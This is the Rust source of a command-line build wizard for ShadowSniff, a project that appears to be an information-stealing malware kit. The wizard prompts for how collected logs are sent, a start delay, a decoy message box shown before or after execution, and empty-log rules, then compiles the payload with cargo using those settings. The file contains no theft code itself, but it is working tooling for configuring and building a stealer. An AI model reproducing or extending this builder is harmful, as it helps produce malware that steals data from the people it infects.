/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
extern crate core;

use builder::empty_log::ConsiderEmpty;
use builder::send_settings::SendSettings;
use builder::start_delay::StartDelay;
use builder::{Ask, ToExprExt};
use inquire::InquireError;
use inquire::ui::{Color, RenderConfig, StyleSheet, Styled};
use quote::quote;
use std::process::{Command, Stdio};
use std::env;
use builder::message_box::{Show, MessageBox};

fn build(
    send_settings: SendSettings,
    consider_empty: Vec<ConsiderEmpty>,
    start_delay: StartDelay,
    message_box: Option<MessageBox>,
) {
    println!("\nStarting build...");

    let mut builder = &mut Command::new("cargo");

    builder = builder.arg("build")
        .env("RUSTFLAGS", "-Awarnings")
        .arg("--release");

    // Compose feature list: always include builder_build, optionally user-provided extras via env BUILDER_EXTRA_FEATURES
    let mut feature_list = String::from("builder_build");
    if let Ok(extra) = env::var("BUILDER_EXTRA_FEATURES") {
        let extra = extra.trim();
        if !extra.is_empty() {
            feature_list.push(',');
            feature_list.push_str(extra);
        }
    }

    builder = builder.arg("--features").arg(feature_list)
        .env(
            "BUILDER_SENDER_EXPR",
            send_settings.to_expr_temp_file(()).display().to_string(),
        )
        .env(
            "BUILDER_CONSIDER_EMPTY_EXPR",
            consider_empty
                .to_expr_temp_file((quote! {collector}, quote! {return;}))
                .display()
                .to_string(),
        )
        .env(
            "BUILDER_START_DELAY",
            start_delay.to_expr_temp_file(()).display().to_string(),
        )
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit());

    if let Some(message_box) = message_box {
        builder = builder
            .arg("--features");
        
        builder = match message_box.show {
            Show::Before => builder.arg("message_box_before_execution"),
            Show::After => builder.arg("message_box_after_execution"),
        };

        builder = builder
            .env(
                "BUILDER_MESSAGE_BOX_EXPR",
                message_box.message.to_expr_temp_file(()).display().to_string(),
            )
    }

    let _ = builder.status()
        .expect("Failed to start cargo build");
}

macro_rules! ask {
    ($expr:expr) => {{
        match $expr {
            Ok(val) => val,
            Err(InquireError::OperationCanceled) | Err(InquireError::OperationInterrupted) => {
                return;
            }
            Err(err) => panic!("{err:?}"),
        }
    }};
}

fn main() {
    inquire::set_global_render_config(
        RenderConfig::default_colored()
            .with_highlighted_option_prefix(Styled::new(">").with_fg(Color::LightRed))
            .with_answered_prompt_prefix(Styled::new(">").with_fg(Color::DarkRed))
            .with_selected_option(Some(StyleSheet::new().with_fg(Color::LightRed)))
            .with_answer(StyleSheet::empty().with_fg(Color::LightRed))
            .with_help_message(StyleSheet::empty().with_fg(Color::DarkRed))
            .with_selected_checkbox(Styled::new("[x]").with_fg(Color::LightRed))
            .with_prompt_prefix(Styled::new("?").with_fg(Color::LightRed)),
    );

    let send = ask!(SendSettings::ask());
    println!();
    let start_delay = ask!(StartDelay::ask());
    println!();
    let message_box = ask!(Option::<MessageBox>::ask());
    println!();
    let consider_empty = ask!(Vec::<ConsiderEmpty>::ask());

    build(send, consider_empty, start_delay, message_box);
}
